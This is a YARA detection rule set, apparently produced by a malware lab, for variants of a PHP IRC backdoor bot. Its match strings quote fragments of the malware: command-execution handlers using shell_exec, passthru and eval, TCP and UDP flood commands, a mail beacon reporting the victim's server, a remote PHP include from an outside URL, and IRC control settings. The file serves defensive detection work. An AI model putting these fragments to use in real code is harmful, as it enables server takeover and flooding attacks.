/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-03-02
   Identifier: php__crewcorp
   Reference: php__crewcorp php_mixed auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule Backdoor_PHP_Crewcorp {
   meta:
      description = "php__crewcorp - file Backdoor.PHP.Crewcorp.a"
      author = "Comps Team Malware Lab"
      reference = "php__crewcorp php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "2230c7bb5b760d8e89bdcde9a317897c42672eb8bcd1d741551cf19b367663ea"
   strings:
      $s1 = " *  .exec <cmd> // uses exec() //execute a command" fullword ascii /* score: '30.00'*/
      $s2 = " *  .cmd <cmd> // uses popen() //execute a command" fullword ascii /* score: '29.00'*/
      $s3 = " *  .sexec <cmd> // uses shell_exec() //execute a command" fullword ascii /* score: '29.00'*/
      $s4 = " *  .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack" fullword ascii /* score: '26.00'*/
      $s5 = "                     \"hostauth\"=>\"ircos.org\" // * for any hostname (remember: /setvhost pucorp.org)" fullword ascii /* score: '23.00'*/
      $s6 = " *  .udpflood <target> <packets> <packetsize> <delay> //udpflood attack" fullword ascii /* score: '23.00'*/
      $s7 = "                                  if(!mail($mcmd[1],\"InBox Test\",\"#crew@corp. since 2003\\n\\nip: $c \\nsoftware: $b \\nsyste" ascii /* score: '21.00'*/
      $s8 = " *  .php <php code> // uses eval() //execute php code" fullword ascii /* score: '21.00'*/
      $s9 = " *  .raw <cmd> //raw IRC command" fullword ascii /* score: '21.00'*/
      $s10 = "nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <admin@xdevil.org>\",$hea" ascii /* score: '20.00'*/
      $s11 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '20.00'*/
      $s12 = "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\"); " fullword ascii /* score: '20.00'*/
      $s13 = "                               $exec = shell_exec($command); " fullword ascii /* score: '20.00'*/
      $s14 = " *  .user <password> //login to the bot" fullword ascii /* score: '19.00'*/
      $s15 = " *  .dns <IP|HOST> //dns lookup" fullword ascii /* score: '19.00'*/
      $s16 = "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")" ascii /* score: '18.00'*/
      $s17 = "                               $exec = passthru($command); " fullword ascii /* score: '18.00'*/
      $s18 = " *  .logout //logout of the bot" fullword ascii /* score: '17.00'*/
      $s19 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '16.00'*/
      $s20 = " *  edited by: devil__ and MEIAFASE <admin@xdevil.org> <meiafase@pucorp.org>" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule Backdoor_PHP_Crewcorp_2 {
   meta:
      description = "php__crewcorp - file Backdoor.PHP.Crewcorp.k"
      author = "Comps Team Malware Lab"
      reference = "php__crewcorp php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "41fff9c78dc9dc186eff3de4ac11df070fb989a46fbe55cdecf594f61f9e768d"
   strings:
      $s1 = " *  .exec <cmd> // uses exec() //execute a command" fullword ascii /* score: '30.00'*/
      $s2 = " *  .cmd <cmd> // uses popen() //execute a command" fullword ascii /* score: '29.00'*/
      $s3 = " *  .sexec <cmd> // uses shell_exec() //execute a command" fullword ascii /* score: '29.00'*/
      $s4 = " *  .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack" fullword ascii /* score: '26.00'*/
      $s5 = " *  .udpflood <target> <packets> <packetsize> <delay> //udpflood attack" fullword ascii /* score: '23.00'*/
      $s6 = "                     \"hostauth\"=>\"*\" // * for any hostname (remember: /setvhost xdevil.org)" fullword ascii /* score: '23.00'*/
      $s7 = " *  .php <php code> // uses eval() //execute php code" fullword ascii /* score: '21.00'*/
      $s8 = " *  .raw <cmd> //raw IRC command" fullword ascii /* score: '21.00'*/
      $s9 = "                                  if(!mail($mcmd[1],\"InBox Test\",\"#korban. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: " ascii /* score: '21.00'*/
      $s10 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '20.00'*/
      $s11 = "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\"); " fullword ascii /* score: '20.00'*/
      $s12 = "                               $exec = shell_exec($command); " fullword ascii /* score: '20.00'*/
      $s13 = "ln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <admin@xdevil.org>\",$header" ascii /* score: '20.00'*/
      $s14 = " *  .user <password> //login to the bot" fullword ascii /* score: '19.00'*/
      $s15 = " *  .dns <IP|HOST> //dns lookup" fullword ascii /* score: '19.00'*/
      $s16 = "<?php include(\"http://www.ewhagu.or.kr/bbs/outlogot_skin/all.txt\");?>" fullword ascii /* score: '19.00'*/
      $s17 = "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")" ascii /* score: '18.00'*/
      $s18 = "                               $exec = passthru($command); " fullword ascii /* score: '18.00'*/
      $s19 = " *  .logout //logout of the bot" fullword ascii /* score: '17.00'*/
      $s20 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule Backdoor_PHP_Crewcorp_3 {
   meta:
      description = "php__crewcorp - file Backdoor.PHP.Crewcorp.b"
      author = "Comps Team Malware Lab"
      reference = "php__crewcorp php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "d474247d365f94e9d731e79de8551efa076faaa3db94a68ee72901b5c104b1c5"
   strings:
      $s1 = " *  .exec <cmd> // uses exec() //execute a command" fullword ascii /* score: '30.00'*/
      $s2 = " *  .cmd <cmd> // uses popen() //execute a command" fullword ascii /* score: '29.00'*/
      $s3 = " *  .sexec <cmd> // uses shell_exec() //execute a command" fullword ascii /* score: '29.00'*/
      $s4 = " *  .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack" fullword ascii /* score: '26.00'*/
      $s5 = " *  .udpflood <target> <packets> <packetsize> <delay> //udpflood attack" fullword ascii /* score: '23.00'*/
      $s6 = "                     \"hostauth\"=>\"*\" // * for any hostname (remember: /setvhost xdevil.org)" fullword ascii /* score: '23.00'*/
      $s7 = " *  .php <php code> // uses eval() //execute php code" fullword ascii /* score: '21.00'*/
      $s8 = " *  .raw <cmd> //raw IRC command" fullword ascii /* score: '21.00'*/
      $s9 = "                                  if(!mail($mcmd[1],\"InBox Test\",\"#korban. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: " ascii /* score: '21.00'*/
      $s10 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '20.00'*/
      $s11 = "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\"); " fullword ascii /* score: '20.00'*/
      $s12 = "                               $exec = shell_exec($command); " fullword ascii /* score: '20.00'*/
      $s13 = "ln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <admin@xdevil.org>\",$header" ascii /* score: '20.00'*/
      $s14 = " *  .user <password> //login to the bot" fullword ascii /* score: '19.00'*/
      $s15 = " *  .dns <IP|HOST> //dns lookup" fullword ascii /* score: '19.00'*/
      $s16 = "<?php include(\"http://www.ewhagu.or.kr/bbs/outlogot_skin/all.txt\");?>" fullword ascii /* score: '19.00'*/
      $s17 = "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")" ascii /* score: '18.00'*/
      $s18 = "                               $exec = passthru($command); " fullword ascii /* score: '18.00'*/
      $s19 = " *  .logout //logout of the bot" fullword ascii /* score: '17.00'*/
      $s20 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Backdoor_PHP_Crewcorp_Backdoor_PHP_Crewcorp_Backdoor_PHP_Crewcorp_0 {
   meta:
      description = "php__crewcorp - from files Backdoor.PHP.Crewcorp.a, Backdoor.PHP.Crewcorp.k, Backdoor.PHP.Crewcorp.b"
      author = "Comps Team Malware Lab"
      reference = "php__crewcorp php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "2230c7bb5b760d8e89bdcde9a317897c42672eb8bcd1d741551cf19b367663ea"
      hash2 = "41fff9c78dc9dc186eff3de4ac11df070fb989a46fbe55cdecf594f61f9e768d"
      hash3 = "d474247d365f94e9d731e79de8551efa076faaa3db94a68ee72901b5c104b1c5"
   strings:
      $s1 = " *  .exec <cmd> // uses exec() //execute a command" fullword ascii /* score: '30.00'*/
      $s2 = " *  .cmd <cmd> // uses popen() //execute a command" fullword ascii /* score: '29.00'*/
      $s3 = " *  .sexec <cmd> // uses shell_exec() //execute a command" fullword ascii /* score: '29.00'*/
      $s4 = " *  .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack" fullword ascii /* score: '26.00'*/
      $s5 = " *  .udpflood <target> <packets> <packetsize> <delay> //udpflood attack" fullword ascii /* score: '23.00'*/
      $s6 = " *  .php <php code> // uses eval() //execute php code" fullword ascii /* score: '21.00'*/
      $s7 = " *  .raw <cmd> //raw IRC command" fullword ascii /* score: '21.00'*/
      $s8 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '20.00'*/
      $s9 = "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\"); " fullword ascii /* score: '20.00'*/
      $s10 = "                               $exec = shell_exec($command); " fullword ascii /* score: '20.00'*/
      $s11 = " *  .user <password> //login to the bot" fullword ascii /* score: '19.00'*/
      $s12 = " *  .dns <IP|HOST> //dns lookup" fullword ascii /* score: '19.00'*/
      $s13 = "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")" ascii /* score: '18.00'*/
      $s14 = "                               $exec = passthru($command); " fullword ascii /* score: '18.00'*/
      $s15 = " *  .logout //logout of the bot" fullword ascii /* score: '17.00'*/
      $s16 = "                               else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/fi" ascii /* score: '16.00'*/
      $s17 = " *  .uname // return shell's uname using a php function (dvl)" fullword ascii /* score: '16.00'*/
      $s18 = " *  .info //get system information" fullword ascii /* score: '16.00'*/
      $s19 = " *  COMMANDS:" fullword ascii /* score: '16.00'*/
      $s20 = "                                  $header = \"From: <inbox\".$token.\"@xdevil.org>\";" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_Crewcorp_Backdoor_PHP_Crewcorp_1 {
   meta:
      description = "php__crewcorp - from files Backdoor.PHP.Crewcorp.k, Backdoor.PHP.Crewcorp.b"
      author = "Comps Team Malware Lab"
      reference = "php__crewcorp php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "41fff9c78dc9dc186eff3de4ac11df070fb989a46fbe55cdecf594f61f9e768d"
      hash2 = "d474247d365f94e9d731e79de8551efa076faaa3db94a68ee72901b5c104b1c5"
   strings:
      $s1 = "                     \"hostauth\"=>\"*\" // * for any hostname (remember: /setvhost xdevil.org)" fullword ascii /* score: '23.00'*/
      $s2 = "                                  if(!mail($mcmd[1],\"InBox Test\",\"#korban. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: " ascii /* score: '21.00'*/
      $s3 = "ln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <admin@xdevil.org>\",$header" ascii /* score: '20.00'*/
      $s4 = "<?php include(\"http://www.ewhagu.or.kr/bbs/outlogot_skin/all.txt\");?>" fullword ascii /* score: '19.00'*/
      $s5 = " *  edited by: devil__ <admin@xdevil.org>" fullword ascii /* score: '16.00'*/
      $s6 = " var $config = array(\"server\"=>\"irc.dal.net\"," fullword ascii /* score: '15.00'*/
      $s7 = " *  #korban. since 2003" fullword ascii /* score: '8.00'*/
      $s8 = "                     \"password\"=>\"1988\"," fullword ascii /* score: '7.00'*/
      $s9 = "                                  if(!mail($mcmd[1],\"InBox Test\",\"#korban. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: " ascii /* score: '5.00'*/
      $s10 = "                     \"port\"=>\"7000\"," fullword ascii /* score: '2.00'*/
      $s11 = "                               $this->privmsg($this->config['chan'],\"[\\2bot\\2]: phpbot 2.0 by; #korban.\");" fullword ascii /* score: '2.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

